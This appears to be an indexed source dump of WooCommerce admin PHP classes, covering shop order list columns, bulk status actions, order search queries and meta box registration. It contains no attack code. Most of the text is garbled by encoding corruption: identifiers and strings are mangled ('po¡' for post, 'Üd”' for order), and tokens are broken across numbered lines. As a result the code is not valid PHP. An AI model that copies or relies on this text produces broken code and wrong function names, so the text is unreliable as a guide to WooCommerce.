	`g‘_shpšg_m‘hod
() ) . '</small>';

194 iàĞ
$po¡
->
comm’t_couÁ
 ) {

197 Ğ
$po¡
->
po¡_¡©us
 !=ğ'Œash' ) ? 
$¡©us
 = '' : $status = 'post-trashed';

199 
$Ï‹¡_nÙes
 = 
	`g‘_comm’ts
Ğ
	`¬¿y
(

200 'po¡_id' => 
$po¡
->
ID
,

202 '¡©us' => 
$¡©us


205 
$Ï‹¡_nÙe
 = 
	`cu¼’t
Ğ
$Ï‹¡_nÙes
 );

207 iàĞ
$po¡
->
comm’t_couÁ
 == 1 ) {

208 
echo
 '<¥ª cÏss="nÙe-Ús" d©a-t="' . 
	`esc_©Œ
Ğ
$Ï‹¡_nÙe
->
comm’t_cÚ‹Á
 ) . '">' . 
	`__
( 'Yes', 'woocommerce' ) . '</span>';

210 
$nÙe_t
 = 
	`is£t
Ğ
$Ï‹¡_nÙe
->
comm’t_cÚ‹Á
 ) ? 
	`esc_©Œ
Ğ$Ï‹¡_nÙe->comm’t_cÚ‹Á . '<sm®È¡yË="di¥Ïy:block">' . 
	`¥rštf
Ğ
	`_n
Ğ'¶u %d oth”‚Ùe', '¶u %d oth”‚Ùes', ( 
$po¡
->
comm’t_couÁ
 - 1 ), 'woocommerce' ), ( $post->comment_count - 1 ) ) . '</small>' ) : sprintf( _n( '%d‚ote', '%d‚otes', $post->comment_count, 'woocommerce' ), $post->comment_count );

212 
echo
 '<¥ª cÏss="nÙe-Ús" d©a-t="' . 
$nÙe_t
 . '">' . 
	`__
( 'Yes', 'woocommerce' ) . '</span>';

216 
echo
 '<span class="na">&ndash;</span>';

221 
echo
 
	`esc_html
Ğ
	`¡r_gs
Ğ
$the_Üd”
->
	`g‘_fÜm©‹d_Üd”_tÙ®
() ) );

223 iàĞ
$the_Üd”
->
·ym’t_m‘hod_t™Ë
 ) {

224 
echo
 '<sm®Èşass="m‘a">' . 
	`__
Ğ'VŸ', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
$the_Üd”
->
·ym’t_m‘hod_t™Ë
 ) . '</small>';

229 
$cu¡om”_t
 = '';

231 iàĞ
$add»ss
 = 
$the_Üd”
->
	`g‘_fÜm©‹d_blšg_add»ss
() ) {

232 
$cu¡om”_t
 .ğ
	`__
Ğ'Blšg:', 'woocomm”û' ) . ' ' . 
$add»ss
 . '<br/><br/>';

235 iàĞ
$the_Üd”
->
blšg_phÚe
 ) {

236 
$cu¡om”_t
 .ğ
	`__
Ğ'T–:', 'woocomm”û' ) . ' ' . 
$the_Üd”
->
blšg_phÚe
;

239 
echo
 '<div cÏss="ts" d©a-t="' . 
	`esc_©Œ
Ğ
$cu¡om”_t
 ) . '">';

241 iàĞ
$the_Üd”
->
u£r_id
 ) {

242 
$u£r_šfo
 = 
	`g‘_u£rd©a
Ğ
$the_Üd”
->
u£r_id
 );

245 iàĞ! 
	`em±y
Ğ
$u£r_šfo
 ) ) {

247 
$u£ºame
 = '<¨h»f="u£r-ed™.php?u£r_id=' . 
	`absšt
Ğ
$u£r_šfo
->
ID
 ) . '">';

249 iàĞ
$u£r_šfo
->
fœ¡_Çme
 || $u£r_šfo->
Ï¡_Çme
 ) {

250 
$u£ºame
 .ğ
	`esc_html
Ğ
	`ucfœ¡
Ğ
$u£r_šfo
->
fœ¡_Çme
 ) . ' ' . ucfœ¡Ğ$u£r_šfo->
Ï¡_Çme
 ) );

252 
$u£ºame
 .ğ
	`esc_html
Ğ
	`ucfœ¡
Ğ
$u£r_šfo
->
di¥Ïy_Çme
 ) );

255 
$u£ºame
 .= '</a>';

258 iàĞ
$the_Üd”
->
blšg_fœ¡_Çme
 || $the_Üd”->
blšg_Ï¡_Çme
 ) {

259 
$u£ºame
 = 
	`Œim
Ğ
$the_Üd”
->
blšg_fœ¡_Çme
 . ' ' . $the_Üd”->
blšg_Ï¡_Çme
 );

261 
$u£ºame
 = 
	`__
( 'Guest', 'woocommerce' );

265 
	`´štf
Ğ
	`__
Ğ'% by %s', 'woocomm”û' ), '<¨h»f="' . 
	`admš_u¾
Ğ'po¡.php?po¡=' . 
	`absšt
Ğ
$po¡
->
ID
 ) . '&aùiÚód™' ) . '"><¡rÚg>' . 
	`esc_©Œ
Ğ
$the_Üd”
->
	`g‘_Üd”_numb”
(èè. '</¡rÚg></a>', 
$u£ºame
 );

267 iàĞ
$the_Üd”
->
blšg_ema
 ) {

268 
echo
 '<sm®Èşass="m‘¨ema"><¨h»f="' . 
	`esc_u¾
Ğ'mato:' . 
$the_Üd”
->
blšg_ema
 ) . '">' . 
	`esc_html
( $the_order->billing_email ) . '</a></small>';

271 
echo
 '</div>';

276 ?><
p
>

277 <?
php


278 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_aùiÚs_¡¬t', 
$the_Üd”
 );

280 
$aùiÚs
 = 
	`¬¿y
();

282 iàĞ
	`š_¬¿y
Ğ
$the_Üd”
->
¡©us
, 
	`¬¿y
( 'pending', 'on-hold' ) ) ) {

283 
$aùiÚs
['´oûssšg'] = 
	`¬¿y
(

284 'u¾' => 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ'admš-ajax.php?aùiÚ=woocomm”û_m¬k_Üd”_´oûssšg&Üd”_id=' . 
$po¡
->
ID
 ), 'woocommerce-mark-order-processing' ),

285 'Çme' => 
	`__
( 'Processing', 'woocommerce' ),

290 iàĞ
	`š_¬¿y
Ğ
$the_Üd”
->
¡©us
, 
	`¬¿y
( 'pending', 'on-hold', 'processing' ) ) ) {

291 
$aùiÚs
['com¶‘e'] = 
	`¬¿y
(

292 'u¾' => 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ'admš-ajax.php?aùiÚ=woocomm”û_m¬k_Üd”_com¶‘e&Üd”_id=' . 
$po¡
->
ID
 ), 'woocommerce-mark-order-complete' ),

293 'Çme' => 
	`__
( 'Complete', 'woocommerce' ),

298 
$aùiÚs
['v›w'] = 
	`¬¿y
(

299 'u¾' => 
	`admš_u¾
Ğ'po¡.php?po¡=' . 
$po¡
->
ID
 . '&action=edit' ),

300 'Çme' => 
	`__
( 'View', 'woocommerce' ),

304 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_Üd”_aùiÚs', $aùiÚs, 
$the_Üd”
 );

306 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$aùiÚ
 ) {

307 
	`´štf
Ğ'<¨şass="bu‰Ú %s" h»f="%s" d©a-t="%s">%s</a>', 
	`esc_©Œ
Ğ
$aùiÚ
['aùiÚ'] ), 
	`esc_u¾
( $action['url'] ),ƒsc_attr( $action['name'] ),ƒsc_attr( $action['name'] ) );

310 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_aùiÚs_’d', 
$the_Üd”
 );

312 </
p
><?
php


317 
	}
}

326 
public
 
funùiÚ
 
	$cu¡om_Üd”_v›ws
Ğ
$v›ws
 ) {

328 
	`un£t
Ğ
$v›ws
['publish'] );

330 iàĞ
	`is£t
Ğ
$v›ws
['trash'] ) ) {

331 
$Œash
 = 
$v›ws
['trash'];

332 
	`un£t
Ğ
$v›ws
['draft'] );

333 
	`un£t
Ğ
$v›ws
['trash'] );

334 
$v›ws
['Œash'] = 
$Œash
;

337  
$v›ws
;

338 
	}
}

347 
public
 
funùiÚ
 
	$bulk_aùiÚs
Ğ
$aùiÚs
 ) {

349 iàĞ
	`is£t
Ğ
$aùiÚs
['edit'] ) ) {

350 
	`un£t
Ğ
$aùiÚs
['edit'] );

353  
$aùiÚs
;

354 
	}
}

363 
public
 
funùiÚ
 
	$»move_row_aùiÚs
Ğ
$aùiÚs
 ) {

364 iàĞ'shİ_Üd”' ==ğ
	`g‘_po¡_ty³
() ) {

365 
	`un£t
Ğ
$aùiÚs
['view'] );

366 
	`un£t
Ğ
$aùiÚs
['inline hide-if-no-js'] );

369  
$aùiÚs
;

370 
	}
}

378 
public
 
funùiÚ
 
	$»¡riù_mªage_Üd”s
() {

379 
glob®
 
$woocomm”û
, 
$ty³now
, 
$wp_qu”y
;

381 iàĞ'shİ_Üd”' !ğ
$ty³now
 ) {

387 <
£Ëù
 
Çme
='shİ_Üd”_¡©us' 
id
='dropdown_shop_order_status'>

388 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Show‡ll statuses', 'woocommerce' ); ?></option>

389 <?
php


390 
$‹rms
 = 
	`g‘_‹rms
('shop_order_status');

392 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

393 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$‹rm
->
¦ug
 ) . '"';

395 iàĞ
	`is£t
Ğ
$wp_qu”y
->
qu”y
['shop_order_status'] ) ) {

396 
	`£Ëùed
Ğ
$‹rm
->
¦ug
, 
$wp_qu”y
->
qu”y
['shop_order_status'] );

399 
echo
 '>' . 
	`esc_html__
Ğ
$‹rm
->
Çme
, 'woocomm”û' ) . ' (' . 
	`absšt
Ğ$‹rm->
couÁ
 ) . ')</option>';

402 </
£Ëù
>

403 <?
php


407 <
£Ëù
 
id
="drİdown_cu¡om”s" 
Çme
="_customer_user">

408 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Show‡ll customers', 'woocommerce' ) ?></option>

409 <?
php


410 iàĞ! 
	`em±y
Ğ
$_GET
['_customer_user'] ) ) {

411 
$u£r
 = 
	`g‘_u£r_by
Ğ'id', 
	`absšt
Ğ
$_GET
['_customer_user'] ) );

412 
echo
 '<İtiÚ v®ue="' . 
	`absšt
Ğ
$u£r
->
ID
 ) . '" ';

413 
	`£Ëùed
( 1, 1 );

414 
echo
 '>' . 
	`esc_html
Ğ
$u£r
->
di¥Ïy_Çme
 ) . ' (#' . 
	`absšt
Ğ$u£r->
ID
 ) . ' &ndash; ' .ƒsc_htmlĞ$u£r->
u£r_ema
 ) . ')</option>';

417 </
£Ëù
>

418 <?
php


420 
	`wc_’queue_js
( "

422 
	`jQu”y
('£Ëù#drİdown_shİ_Üd”_¡©us, s–eù[Çme=m]').
	`css
('width', '150px').
	`cho£n
();

424 
	`jQu”y
('£Ëù#drİdown_cu¡om”s').
	`css
('width', '250px').
	`ajaxCho£n
({

425 
m‘hod
: 'GET',

426 
u¾
: '" .‡dmš_u¾Ğ'
admš
-
ajax
.
php
' ) . "',

427 
d©aTy³
: 'json',

428 
aá”Ty³D–ay
: 100,

429 
mšT”mL’gth
: 1,

430 
d©a
: {

431 
aùiÚ
: 'woocommerce_json_search_customers',

432 
£cur™y
: '" . wp_ü—‹_nÚûĞ'
£¬ch
-
cu¡om”s
' ) . "',

433 : '" . __Ğ'
Show
 
®l
 
cu¡om”s
', '
woocomm”û
' ) . "'

435 }, 
	`funùiÚ
 (
d©a
) {

437 
v¬
 
‹rms
 = {};

439 
$
.
	`—ch
(
d©a
, 
	`funùiÚ
 (
i
, 
v®
) {

440 
‹rms
[
i
] = 
v®
;

443  
‹rms
;

446 
	}
}

455 
public
 
funùiÚ
 
	$Üd”s_by_cu¡om”_qu”y
Ğ
$v¬s
 ) {

456 
glob®
 
$ty³now
, 
$wp_qu”y
;

458 iàĞ
$ty³now
 =ğ'shİ_Üd”' && 
	`is£t
Ğ
$_GET
['_customer_user'] ) && $_GET['_customer_user'] > 0 ) {

459 
$v¬s
['meta_key'] = '_customer_user';

460 
$v¬s
['m‘a_v®ue'] = (è
$_GET
['_customer_user'];

463  
$v¬s
;

464 
	}
}

475 
public
 
funùiÚ
 
	$cu¡om_shİ_Üd”_sÜt
Ğ
$cŞumns
 ) {

476 
$cu¡om
 = 
	`¬¿y
(

481 
	`un£t
Ğ
$cŞumns
['comments'] );

483  
	`wp_·r£_¬gs
Ğ
$cu¡om
, 
$cŞumns
 );

484 
	}
}

493 
public
 
funùiÚ
 
	$cu¡om_shİ_Üd”_Üd”by
Ğ
$v¬s
 ) {

494 
glob®
 
$ty³now
, 
$wp_qu”y
;

496 iàĞ'shİ_Üd”' !ğ
$ty³now
 ) {

497  
$v¬s
;

501 iàĞ
	`is£t
Ğ
$v¬s
['orderby'] ) ) {

502 iàĞ'Üd”_tÙ®' =ğ
$v¬s
['orderby'] ) {

503 
$v¬s
 = 
	`¬¿y_m”ge
Ğ$v¬s, 
	`¬¿y
(

510  
$v¬s
;

511 
	}
}

520 
public
 
funùiÚ
 
	$shİ_Üd”_£¬ch_cu¡om_f›lds
Ğ
$wp
 ) {

521 
glob®
 
$·g’ow
, 
$wpdb
;

523 iàĞ'ed™.php' !ğ
$·g’ow
 || 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['s'] ) || $wp->query_vars['post_type'] != 'shop_order' ) {

527 
$£¬ch_f›lds
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
	`­¶y_f‹rs
Ğ'woocomm”û_shİ_Üd”_£¬ch_f›lds', 
	`¬¿y
(

546 
$£¬ch_Üd”_id
 = 
	`¡r_»¶aû
Ğ'Ord” #', '', 
$_GET
['s'] );

547 iàĞ! 
	`is_num”ic
Ğ
$£¬ch_Üd”_id
 ) ) {

548 
$£¬ch_Üd”_id
 = 0;

552 
$po¡_ids
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m”ge
(

553 
$wpdb
->
	`g‘_cŞ
(

554 
$wpdb
->
	`´•¬e
( "

555 
SELECT
 
p1
.
po¡_id


556 
FROM
 {
$wpdb
->
po¡m‘a
} 
p1


557 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
p2
 
ON
 
p1
.
po¡_id
 =…2.post_id

558 
WHERE


559 Ğ
p1
.
m‘a_key
 = '_blšg_fœ¡_Çme' 
AND
 
p2
.m‘a_key = '_blšg_Ï¡_Çme' AND 
	`CONCAT
Õ1.
m‘a_v®ue
, ' ',…2.m‘a_v®ueè
LIKE
 '%%%s%%' )

560 
OR


561 Ğ
p1
.
m‘a_key
 = '_shpšg_fœ¡_Çme' 
AND
 
p2
.m‘a_key = '_shpšg_Ï¡_Çme' AND 
	`CONCAT
Õ1.
m‘a_v®ue
, ' ',…2.m‘a_v®ueè
LIKE
 '%%%s%%' )

562 
OR


563 Ğ
p1
.
m‘a_key
 
	`IN
 ('" . im¶odeĞ"','", $£¬ch_f›ld è. "'è
AND
…1.
m‘a_v®ue
 
LIKE
 '%%%s%%' )

565 
	`esc_©Œ
Ğ
$_GET
['s'] ),ƒsc_attr( $_GET['s'] ),ƒsc_attr( $_GET['s'] )

568 
$wpdb
->
	`g‘_cŞ
(

569 
$wpdb
->
	`´•¬e
( "

570 
SELECT
 
Üd”_id


571 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
 
as
 
Üd”_™ems


572 
WHERE
 
Üd”_™em_Çme
 
LIKE
 '%%%s%%'

574 
	`esc_©Œ
Ğ
$_GET
['s'] )

577 
	`¬¿y
Ğ
$£¬ch_Üd”_id
 )

581 
	`un£t
Ğ
$wp
->
qu”y_v¬s
['s'] );

584 
$wp
->
qu”y_v¬s
['shİ_Üd”_£¬ch'] = 
Œue
;

587 
$wp
->
qu”y_v¬s
['po¡__š'] = 
$po¡_ids
;

588 
	}
}

597 
public
 
funùiÚ
 
	$shİ_Üd”_£¬ch_Ïb–
Ğ
$qu”y
 ) {

598 
glob®
 
$·g’ow
, 
$ty³now
;

600 iàĞ'ed™.php' !ğ
$·g’ow
 ) {

601  
$qu”y
;

604 iàĞ
$ty³now
 != 'shop_order' ) {

605  
$qu”y
;

608 iàĞ! 
	`g‘_qu”y_v¬
( 'shop_order_search' ) ) {

609  
$qu”y
;

612  
	`wp_un¦ash
Ğ
$_GET
['s'] );

613 
	}
}

622 
public
 
funùiÚ
 
	$add_cu¡om_qu”y_v¬
Ğ
$public_qu”y_v¬s
 ) {

623 
$public_qu”y_v¬s
[] = 'sku';

624 
$public_qu”y_v¬s
[] = 'shop_order_search';

626  
$public_qu”y_v¬s
;

627 
	}
}

635 
public
 
funùiÚ
 
	$d–‘e_Üd”_™ems
Ğ
$po¡id
 ) {

636 
glob®
 
$wpdb
;

638 iàĞ
	`g‘_po¡_ty³
Ğ
$po¡id
 ) == 'shop_order' ) {

639 
	`do_aùiÚ
Ğ'woocomm”û_d–‘e_Üd”_™ems', 
$po¡id
 );

641 
$wpdb
->
	`qu”y
( "

642 
DELETE
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
, {$wpdb->´efix}
woocomm”û_Üd”_™emm‘a


643 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems


644 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
ON
 {$wpdb->´efix}
woocomm”û_Üd”_™ems
.
Üd”_™em_id
 = {$wpdb->prefix}woocommerce_order_itemmeta.order_item_id

645 
WHERE
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
.
Üd”_id
 = '{$postid}';

648 
	`do_aùiÚ
Ğ'woocomm”û_d–‘ed_Üd”_™ems', 
$po¡id
 );

650 
	}
}

660 
public
 
funùiÚ
 
	$bulk_admš_foÙ”
() {

661 
glob®
 
$po¡_ty³
;

663 iàĞ'shİ_Üd”' =ğ
$po¡_ty³
 ) {

665 <
süt
 
ty³
="text/javascript">

666 
	`jQu”y
(
	`funùiÚ
() {

667 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_´oûssšg').
	`‹xt
('<?ph°_eĞ'
M¬k
 
´oûssšg
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action']");

668 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_´oûssšg').
	`‹xt
('<?ph°_eĞ'
M¬k
 
´oûssšg
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action2']");

670 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_Ú-hŞd').
	`‹xt
('<?ph°_eĞ'
M¬k
 
Ú
-
hŞd
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action']");

671 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_Ú-hŞd').
	`‹xt
('<?ph°_eĞ'
M¬k
 
Ú
-
hŞd
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action2']");

673 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_com¶‘ed').
	`‹xt
('<?ph°_eĞ'
M¬k
 
com¶‘ed
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action']");

674 
	`jQu”y
('<İtiÚ>').
	`v®
('m¬k_com¶‘ed').
	`‹xt
('<?ph°_eĞ'
M¬k
 
com¶‘ed
', '
woocomm”û
' )?>').
	`­³ndTo
("select[name='action2']");

676 </
süt
>

677 <?
php


679 
	}
}

687 
public
 
funùiÚ
 
	$bulk_aùiÚ
() {

688 
$wp_li¡_bË
 = 
	`_g‘_li¡_bË
( 'WP_Posts_List_Table' );

689 
$aùiÚ
 = 
$wp_li¡_bË
->
	`cu¼’t_aùiÚ
();

691  
$aùiÚ
 ) {

693 
$Ãw_¡©us
 = 'completed';

694 
$»pÜt_aùiÚ
 = 'marked_completed';

697 
$Ãw_¡©us
 = 'processing';

698 
$»pÜt_aùiÚ
 = 'marked_processing';

701 
$Ãw_¡©us
 = 'on-hold';

702 
$»pÜt_aùiÚ
 = 'marked_on-hold';

709 
$chªged
 = 0;

711 
$po¡_ids
 = 
	`¬¿y_m­
Ğ'absšt', (
¬¿y
è
$_REQUEST
['post'] );

713 
	`fÜ—ch
 ( 
$po¡_ids
 
as
 
$po¡_id
 ) {

714 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡_id
 );

715 
$Üd”
->
	`upd©e_¡©us
Ğ
$Ãw_¡©us
, 
	`__
( 'Order status changed by bulkƒdit:', 'woocommerce' ) );

716 
$chªged
++;

719 
$£ndback
 = 
	`add_qu”y_¬g
Ğ
	`¬¿y
Ğ'po¡_ty³' => 'shİ_Üd”', 
$»pÜt_aùiÚ
 => 
Œue
, 'chªged' => 
$chªged
, 'ids' => 
	`još
Ğ',', 
$po¡_ids
 ) ), '' );

720 
	`wp_»dœeù
Ğ
$£ndback
 );

721 
	`ex™
();

722 
	}
}

730 
public
 
funùiÚ
 
	$bulk_admš_nÙiûs
() {

731 
glob®
 
$po¡_ty³
, 
$·g’ow
;

733 iàĞ
	`is£t
Ğ
$_REQUEST
['marked_completed'] ) || isset( $_REQUEST['marked_processing'] ) || isset( $_REQUEST['marked_on-hold'] ) ) {

734 
$numb”
 = 
	`is£t
Ğ
$_REQUEST
['chªged'] ) ? 
	`absšt
( $_REQUEST['changed'] ) : 0;

736 iàĞ'ed™.php' =ğ
$·g’ow
 && 'shİ_Üd”' =ğ
$po¡_ty³
 ) {

737 
$mes§ge
 = 
	`¥rštf
Ğ
	`_n
Ğ'Ord” stu chªged.', '% Üd” stu£ chªged.', 
$numb”
, 'woocomm”û' ), 
	`numb”_fÜm©_i18n
( $number ) );

738 
echo
 '<div cÏss="upd©ed"><p>' . 
$mes§ge
 . '</p></div>';

741 
	}
}

745 
	g’dif
;

747  
Ãw
 
WC_Admš_CPT_Shİ_Ord”
();

	@includes/admin/post-types/class-wc-admin-cpt.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT' ) ) :

18 şas 
	cWC_Admš_CPT
 {

20 
´Ùeùed
 
$ty³
 = '';

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

27 
	`add_f‹r
Ğ'medŸ_v›w_¡ršgs', 
	`¬¿y
Ğ
$this
, 'change_insert_into_post' ) );

36 
funùiÚ
 
	$chªge_š£¹_što_po¡
Ğ
$¡ršgs
 ) {

37 
glob®
 
$po¡_ty³
;

39 iàĞ
$po¡_ty³
 =ğ
$this
->
ty³
 ) {

40 
$obj
 = 
	`g‘_po¡_ty³_objeù
Ğ
$this
->
ty³
 );

42 
$¡ršgs
['š£¹IÁoPo¡'] = 
	`¥rštf
Ğ
	`__
Ğ'In£¹ iÁØ%s', 'woocomm”û' ), 
$obj
->
Ïb–s
->
sšguÏr_Çme
 );

43 
$¡ršgs
['u¶ßdedToThisPo¡'] = 
	`¥rštf
Ğ
	`__
Ğ'U¶ßdedØthi %s', 'woocomm”û' ), 
$obj
->
Ïb–s
->
sšguÏr_Çme
 );

46  
$¡ršgs
;

47 
	}
}

50 
	g’dif
;

	@includes/admin/post-types/class-wc-admin-meta-boxes.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_Admš_M‘a_Boxes
 {

20 
´iv©e
 
	m$m‘a_box_”rÜs
 = 
¬¿y
();

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

26 
	`add_aùiÚ
Ğ'add_m‘a_boxes', 
	`¬¿y
Ğ
$this
, 'remove_meta_boxes' ), 10 );

27 
	`add_aùiÚ
Ğ'add_m‘a_boxes', 
	`¬¿y
Ğ
$this
, 'rename_meta_boxes' ), 20 );

28 
	`add_aùiÚ
Ğ'add_m‘a_boxes', 
	`¬¿y
Ğ
$this
, 'add_meta_boxes' ), 30 );

29 
	`add_aùiÚ
Ğ'add_m‘a_boxes', 
	`¬¿y
( 'WC_Gateway_Mijireh', 'add_page_slurp_meta' ) );

30 
	`add_aùiÚ
Ğ'§ve_po¡', 
	`¬¿y
Ğ
$this
, 'save_meta_boxes' ), 1, 2 );

42 
	`add_aùiÚ
( 'woocommerce_process_shop_order_meta', 'WC_Meta_Box_Order_Items::save', 10, 2 );

43 
	`add_aùiÚ
( 'woocommerce_process_shop_order_meta', 'WC_Meta_Box_Order_Totals::save', 20, 2 );

44 
	`add_aùiÚ
( 'woocommerce_process_shop_order_meta', 'WC_Meta_Box_Order_Downloads::save', 30, 2 );

45 
	`add_aùiÚ
( 'woocommerce_process_shop_order_meta', 'WC_Meta_Box_Order_Data::save', 40, 2 );

46 
	`add_aùiÚ
( 'woocommerce_process_shop_order_meta', 'WC_Meta_Box_Order_Actions::save', 50, 2 );

49 
	`add_aùiÚ
( 'woocommerce_process_product_meta', 'WC_Meta_Box_Product_Data::save', 10, 2 );

50 
	`add_aùiÚ
( 'woocommerce_process_product_meta', 'WC_Meta_Box_Product_Images::save', 20, 2 );

53 
	`add_aùiÚ
( 'woocommerce_process_shop_coupon_meta', 'WC_Meta_Box_Coupon_Data::save', 10, 2 );

56 
	`add_aùiÚ
( 'comment_edit_redirect', 'WC_Meta_Box_Order_Reviews::save', 1, 2 );

59 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'output_errors' ) );

60 
	`add_aùiÚ
Ğ'shutdown', 
	`¬¿y
Ğ
$this
, 'save_errors' ) );

67 
public
 
funùiÚ
 
	$add_”rÜ
Ğ
$‹xt
 ) {

68 
£lf
::
$m‘a_box_”rÜs
[] = 
$‹xt
;

69 
	}
}

74 
public
 
funùiÚ
 
	$§ve_”rÜs
() {

75 
	`upd©e_İtiÚ
Ğ'woocomm”û_m‘a_box_”rÜs', 
£lf
::
$m‘a_box_”rÜs
 );

76 
	}
}

81 
public
 
funùiÚ
 
	$ouut_”rÜs
() {

82 
$”rÜs
 = 
	`maybe_un£rŸlize
Ğ
	`g‘_İtiÚ
( 'woocommerce_meta_box_errors' ) );

84 iàĞ! 
	`em±y
Ğ
$”rÜs
 ) ) {

86 
echo
 '<div id="woocommerce_errors" class="error fade">';

87 
	`fÜ—ch
 ( 
$”rÜs
 
as
 
$”rÜ
 ) {

88 
echo
 '<p>' . 
	`esc_html
Ğ
$”rÜ
 ) . '</p>';

90 
echo
 '</div>';

93 
	`d–‘e_İtiÚ
( 'woocommerce_meta_box_errors' );

95 
	}
}

100 
public
 
funùiÚ
 
	$add_m‘a_boxes
() {

102 
	`add_m‘a_box
Ğ'po¡exû½t', 
	`__
( 'Product Short Description', 'woocommerce' ), 'WC_Meta_Box_Product_Short_Description::output', 'product', 'normal' );

103 
	`add_m‘a_box
Ğ'woocomm”û-´oduù-d©a', 
	`__
( 'Product Data', 'woocommerce' ), 'WC_Meta_Box_Product_Data::output', 'product', 'normal', 'high' );

104 
	`add_m‘a_box
Ğ'woocomm”û-´oduù-images', 
	`__
( 'Product Gallery', 'woocommerce' ), 'WC_Meta_Box_Product_Images::output', 'product', 'side' );

107 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-d©a', 
	`__
( 'Order Data', 'woocommerce' ), 'WC_Meta_Box_Order_Data::output', 'shop_order', 'normal', 'high' );

108 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-™ems', 
	`__
( 'Order Items', 'woocommerce' ), 'WC_Meta_Box_Order_Items::output', 'shop_order', 'normal', 'high' );

109 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-tÙ®s', 
	`__
( 'Order Totals', 'woocommerce' ), 'WC_Meta_Box_Order_Totals::output', 'shop_order', 'side', 'default' );

110 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-nÙes', 
	`__
( 'Order Notes', 'woocommerce' ), 'WC_Meta_Box_Order_Notes::output', 'shop_order', 'side', 'default' );

111 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-dowÆßds', 
	`__
( 'Downloadable Product Permissions', 'woocommerce' ) . ' <span class="tips" data-tip="' . __( 'Note: Permissions for order items will‡utomatically be granted whenhe order status changeso…rocessing/completed.', 'woocommerce' ) . '">[?]</span>', 'WC_Meta_Box_Order_Downloads::output', 'shop_order', 'normal', 'default' );

112 
	`add_m‘a_box
Ğ'woocomm”û-Üd”-aùiÚs', 
	`__
( 'Order Actions', 'woocommerce' ), 'WC_Meta_Box_Order_Actions::output', 'shop_order', 'side', 'high' );

115 
	`add_m‘a_box
Ğ'woocomm”û-coupÚ-d©a', 
	`__
( 'Coupon Data', 'woocommerce' ), 'WC_Meta_Box_Coupon_Data::output', 'shop_coupon', 'normal', 'high' );

118 iàĞ'comm’t' =ğ
	`g‘_cu¼’t_sü“n
()->
id
 && 
	`is£t
Ğ
$_GET
['c'] ) ) {

119 iàĞ
	`g‘_comm’t_m‘a
Ğ
	`štv®
Ğ
$_GET
['c'] ), '¿tšg', 
Œue
 ) ) {

120 
	`add_m‘a_box
Ğ'woocomm”û-¿tšg', 
	`__
( 'Rating', 'woocommerce' ), 'WC_Meta_Box_Order_Reviews::output', 'comment', 'normal', 'high' );

123 
	}
}

128 
public
 
funùiÚ
 
	$»move_m‘a_boxes
() {

129 
	`»move_m‘a_box
( 'postexcerpt', 'product', 'normal' );

130 
	`»move_m‘a_box
( 'product_shipping_classdiv', 'product', 'side' );

131 
	`»move_m‘a_box
( 'pageparentdiv', 'product', 'side' );

132 
	`»move_m‘a_box
( 'commentstatusdiv', 'product', 'normal' );

133 
	`»move_m‘a_box
( 'commentstatusdiv', 'product', 'side' );

134 
	`»move_m‘a_box
( 'woothemes-settings', 'shop_coupon' , 'normal' );

135 
	`»move_m‘a_box
( 'commentstatusdiv', 'shop_coupon' , 'normal' );

136 
	`»move_m‘a_box
( 'slugdiv', 'shop_coupon' , 'normal' );

137 
	`»move_m‘a_box
( 'commentsdiv', 'shop_order' , 'normal' );

138 
	`»move_m‘a_box
( 'woothemes-settings', 'shop_order' , 'normal' );

139 
	`»move_m‘a_box
( 'commentstatusdiv', 'shop_order' , 'normal' );

140 
	`»move_m‘a_box
( 'slugdiv', 'shop_order' , 'normal' );

141 
	}
}

146 
public
 
funùiÚ
 
	$»Çme_m‘a_boxes
() {

147 
glob®
 
$po¡
;

150 iàĞ
	`is£t
Ğ
$po¡
 ) && ( 'publish' =ğ$po¡->
po¡_¡©us
 || 'private' == $post->post_status ) ) {

151 
	`»move_m‘a_box
( 'commentsdiv', 'product', 'normal' );

153 
	`add_m‘a_box
Ğ'comm’tsdiv', 
	`__
( 'Reviews', 'woocommerce' ), 'post_comment_meta_box', 'product', 'normal' );

155 
	}
